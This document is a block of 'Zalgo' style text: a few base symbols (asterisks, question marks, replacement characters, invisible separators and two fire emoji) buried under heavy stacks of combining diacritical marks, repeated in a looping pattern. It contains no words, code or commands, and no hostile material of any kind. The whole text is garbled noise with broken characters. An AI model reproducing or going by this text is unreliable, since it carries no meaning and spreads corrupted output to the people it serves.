̨̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̛͌̏̀̽̓̓͑̽̂̑̾̆͝͡